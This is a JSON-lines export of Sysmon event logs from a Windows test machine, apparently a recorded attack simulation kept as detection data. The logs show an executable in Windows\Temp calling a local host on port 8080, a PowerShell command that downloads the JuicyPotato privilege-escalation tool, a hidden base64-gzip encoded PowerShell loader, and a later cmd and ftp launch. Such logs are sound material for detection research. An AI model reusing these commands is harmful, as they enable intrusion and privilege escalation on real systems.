{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-329A-6095-1506-000000001D00","ProcessId":8136,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50898,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:14.953"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2593,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:16.174043Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-329A-6095-1406-000000001D00","ProcessId":2860,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50899,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:14.963"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2594,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:16.174081Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-329B-6095-1906-000000001D00","ParentProcessId":9260,"ProcessGuid":"747F3D96-329D-6095-1A06-000000001D00","ProcessId":9296,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:17.150"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2595,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:17.169655Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-329B-6095-1806-000000001D00","ParentProcessId":9252,"ProcessGuid":"747F3D96-329D-6095-1B06-000000001D00","ProcessId":9304,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:17.167"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2596,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:17.170250Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:18.103","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329D-6095-1A06-000000001D00","ProcessId":9296,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92962\\msvcm90.dll","UtcTime":"2021-05-07 12:29:18.103"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2597,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:18.125312Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-329B-6095-1906-000000001D00","ProcessId":9260,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50902,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:17.134"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2598,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:18.386014Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-329B-6095-1806-000000001D00","ProcessId":9252,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50903,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:17.150"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2599,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:18.386235Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:18.493","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329D-6095-1A06-000000001D00","ProcessId":9296,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92962\\msvcp90.dll","UtcTime":"2021-05-07 12:29:18.493"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2600,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:18.500046Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:18.511","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329D-6095-1B06-000000001D00","ProcessId":9304,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI93042\\msvcm90.dll","UtcTime":"2021-05-07 12:29:18.511"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2601,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:18.523604Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:18.728","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329D-6095-1B06-000000001D00","ProcessId":9304,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI93042\\msvcp90.dll","UtcTime":"2021-05-07 12:29:18.728"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2602,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:18.740184Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:18.884","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329D-6095-1B06-000000001D00","ProcessId":9304,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI93042\\msvcr90.dll","UtcTime":"2021-05-07 12:29:18.884"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2603,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:18.908864Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:18.900","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329D-6095-1A06-000000001D00","ProcessId":9296,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92962\\msvcr90.dll","UtcTime":"2021-05-07 12:29:18.900"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2604,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:18.908997Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:19.150","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329D-6095-1B06-000000001D00","ProcessId":9304,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI93042\\python27.dll","UtcTime":"2021-05-07 12:29:19.150"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2605,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:19.175237Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:29:19.571","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-329D-6095-1A06-000000001D00","ProcessId":9296,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI92962\\python27.dll","UtcTime":"2021-05-07 12:29:19.571"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2606,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:19.587107Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-329D-6095-1B06-000000001D00","ParentProcessId":9304,"ProcessGuid":"747F3D96-329F-6095-1C06-000000001D00","ProcessId":9320,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:19.908"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2607,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:19.914838Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-329D-6095-1A06-000000001D00","ParentProcessId":9296,"ProcessGuid":"747F3D96-32A1-6095-1D06-000000001D00","ProcessId":9332,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:29:21.371"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2608,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:29:21.376083Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\Windows\\system32\\cmd.exe","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Windows Command Processor","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Hashes":"MD5=DB126FF10E71753C0C29210C090927A3,SHA256=B94D1C553C7EF81DF040D6BE59120EB0A8F67AEC1A787A2B6B537309CBAF8CC4,IMPHASH=392B4D61B1D1DADC1F06444DF258188A","Image":"C:\\Windows\\SysWOW64\\cmd.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"Cmd.Exe","ParentCommandLine":"\"powershell.exe\" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPgilWACA7VW+2+bSBD+OZHyP6DKkkF1DH5cm0SqdAs2No1xcPDbtaoNrPHWC+vCEsft9X+/wYY0VZO79qRDfuxjZnbmm29nWKWRJyiPJNEj0tez0xMHxziU5FJQr0glL3RHpnJyAuslPG9cSO8keYG22xYPMY2WV1dGGsckEsd5tUMEShIS3jFKElmR/pImaxKT85u7T8QT0lep9LHaYfwOs1xsb2BvTaRzFPnZXo97OHOm6m4ZFXL5w4eysjivLavtzylmiVx294kgYdVnrKxI35TswOF+S+SyTb2YJ3wlqhMaNerVUZTgFemDtXtiE7HmflJWIAr4xESkcSQd4skMHLflMgydmHvI92OSJOWKtMhML5bLP+VFfu5tGgkakqoVCRLzrUvie+qRpNrFkc/ILVktQcsVMY2CpaKA2D3fELkUpYxVpN8xI/fJrkDtV5Xkp0og5YhYqUAin4nT5n7KyFGz/IyjkHwFnkcCAHLfzk7PTlcFWTZ32/bHp3SB0cniMCbgnuzwhB4E30laRbLhICx4vIdpaRinRFk+giuVkk+Vl7VrhSgIBuFNSmFtMebUX4JOntAS34+u69nGy8xskRWNSGsf4ZB6Bfnk52AmK0YOQVYLsT64JZfzDeK3CCMBFhlwWbZ/UmuHVDzq6illPomRB6lKwCvIovKjM8dcyGUrskkIGB3nQL/SCihPCumc5vvi9GwOQmWD4SSpSE4Kd86rSC7BjPgVCUUJzbdQKvhhWP7urp0yQT2ciMLcUnkEMj/Q4FEi4tSDvEHwQ3dLPIpZhkVF6lKf6HuXBsXB5WeRMDBjcBXA0j1kAlYyBFyRsSEGHyHzStUlwgq3jIQgcbj7JsMB3PSc7gfy4ID45Z8cLPh8JG+GRQHCE/cgwS7joiKNaSyghmS4Hnj0X45/UjyOjhgxyVMhF1dkoe9FxutS7NsZJXNUDhjEAuI3Yx7qOCFvmsdCIb9Sb6iD4JlZEbP99xtas3bwteE7slcXjtB4SBsWtz0jcTrmBaK7YOdd9JHnv/fJpTtuCrdtCcNB3QHV9Oba07UhjEeWmFmWsDqoO1x7THPaYa9vJQ/qrjvJbB1teM1md6qhRqN509A2ANyM1oIN8vsh3T30YAwV8aanW4muWaz93ri9m9TN+YR11aa5Xk144r6ZtVRVvfRxy94jpHO/Ye+ntVs+7Hqh3oy4emk0N6iNkBG1x6bOr2d6jBx1jIMt310HulEPDISGLiXzwcjUBwNTR6POp8+tSzVQLydTvNYn4zqdb6e3a5ibu+7gWtWalk++8PkOgOtwhINbkAmMurdegUzrNdJf93lSxxudIx1kzPln1FnPtqbDYH84qnM0Zv0pRr353lTV2sxpoq7GJ50ADUAcB/oAo+S+9aWl1sY+9yd/9GcrdTxlb9WWMXDW0yxmdRtmv7tu69qb13bezduL3oSOQ45Gqjp+lXEGSFP6Ej5hwkt13MZxssYMGAIFuriWJo/NvOY6nGYaspw16g2JI8Kgz0EnLKiNGONeVvGPxRnazbEJZD1pBMNG/dmRIj0KKt9bQbF0dTUHL+GyAJ2rPRIFYl3RHhqaBmVde2hqEOKvB2bw7V7OLFWyrgCw5HbZwa6SXZ8Ss1f/K1j5lV3Dn/+vYH1f+4fdXwJQq2Th/rT448Jvgfm7gU8wFSDoQslh5NjzXog/58WT9wJICmR9lT/Ze91NKs778LZwdvo3FKWIS0EKAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))","ParentImage":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessGuid":"747F3D96-308D-6095-D004-000000001D00","ParentProcessId":2552,"ProcessGuid":"747F3D96-3301-6095-1E06-000000001D00","ProcessId":9628,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:30:57.218"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2609,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:30:57.221170Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"ftp","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"File Transfer Program","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=F0707986208091066AFD2AB0A73D1693,SHA256=BE279F10D7FF4C18D69724EF0EB04C91D8A34AAC0DB610E638B000991DFB8B02,IMPHASH=F76AC455BB3971C0CB2A43FDCD1FF525","Image":"C:\\Windows\\SysWOW64\\ftp.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"ftp.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentProcessGuid":"747F3D96-3301-6095-1E06-000000001D00","ParentProcessId":9628,"ProcessGuid":"747F3D96-3318-6095-2006-000000001D00","ProcessId":9736,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:20.160"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2610,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:20.165717Z"}},"Version":5}}
